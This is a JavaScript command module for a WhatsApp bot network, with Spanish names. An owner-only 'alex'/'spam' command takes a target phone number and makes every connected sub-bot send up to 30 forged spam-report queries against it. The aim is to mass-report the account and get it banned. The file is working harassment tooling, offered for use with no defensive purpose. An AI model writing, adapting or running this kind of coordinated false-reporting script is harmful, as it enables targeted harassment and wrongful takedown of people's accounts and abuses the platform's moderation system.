import { getAllSockets } from "../../lib/subbotManager.js";

const OWNER = '50578391933';
const MIN = 2;
const MAX = 30;
const FLOW = "ContactInfo";
const TO = 15000;

function sacarNumero(jid) {
    return String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');
}

function parseTarget(raw) {
    if (!raw) return null;
    const at = raw.lastIndexOf("@");
    if (at !== -1) {
        const user = raw.slice(0, at).split(":")[0].replace(/\D/g, "");
        const server = raw.slice(at + 1).toLowerCase();
        return user ? `${user}@${server}` : null;
    }
    const d = raw.replace(/\D/g, "");
    return d.length >= 7 ? `${d}@s.whatsapp.net` : null;
}

export default {
    nombre: 'alex',
    categoria: 'Owner',
    alias: ['reportnum', 'spam', 'spamnum'],
    descripcion: 'Reporte masivo (Solo Owner)',
    ejecutar: async ({ sock, msg, argumento, responder }) => {
        const sender = msg.key.participant || msg.key.remoteJid || '';
        if (sacarNumero(sender) !== OWNER) {
            return responder.texto('🔒 Acceso denegado. Solo Owner.');
        }

        const args = String(argumento || '').trim().split(/\s+/).filter(Boolean);
        let num = null;
        let porBot = null;
        let flow = FLOW;

        for (const tk of args) {
            if (tk === "|") continue;
            const low = tk.toLowerCase();
            if (low === "menu") { flow = "MessageMenu"; continue; }
            if (low === "contacto") { flow = "ContactInfo"; continue; }
            const dig = tk.replace(/\D/g, "");
            if (num === null && dig.length >= 7) { num = tk; continue; }
            if (porBot === null && dig.length >= 1 && dig.length <= 2) porBot = +dig;
        }

        const target = parseTarget(num);
        if (!target) {
            return responder.texto('❌ Uso: .alex <numero> | <cantidad>\nEjemplo: .alex +50578391933 | 10');
        }

        const pool = [...new Set([...getAllSockets(), sock])].filter(s => s?.user?.id && s?.ws?.isOpen !== false);
        if (pool.length === 0) return responder.texto('❌ No hay bots conectados.');

        if (porBot === null) porBot = MAX;
        else if (porBot < MIN) porBot = MIN;
        else if (porBot > MAX) porBot = MAX;

        const shuffled = pool.slice().sort(() => Math.random() - 0.5);
        const base = {
            tag: "iq",
            attrs: { to: "s.whatsapp.net", type: "set", xmlns: "spam" },
            content: [{ tag: "spam_list", attrs: { jid: target, spam_flow: flow }, content: [] }]
        };

        await responder.texto(`⏳ Enviando ${shuffled.length * porBot} reportes...`);
        const tareas = [];
        for (const s of shuffled) {
            for (let k = 0; k < porBot; k++) {
                tareas.push(s.query({ ...base, attrs: { ...base.attrs } }, TO));
            }
        }

        const res = await Promise.allSettled(tareas);
        let ok = 0, sinR = 0, fail = 0;
        for (const r of res) {
            if (r.status === "fulfilled") ok++;
            else if (/timeout/i.test(r.reason?.message || '')) sinR++;
            else fail++;
        }

        const numStr = target.split("@")[0];
        return responder.texto(
            `📢 *Reporte enviado*\n\n` +
            `> • Número: +${numStr}\n` +
            `> • Bots: ${shuffled.length}\n` +
            `> • Por bot: ${porBot}\n` +
            `> • Total: ${shuffled.length * porBot}\n` +
            `> • ✅ Exitosos: ${ok}\n` +
            (sinR ? `> • ⏱️ Sin respuesta: ${sinR}\n` : '') +
            (fail ? `> • ❌ Fallidos: ${fail}\n` : '')
        );
    }
};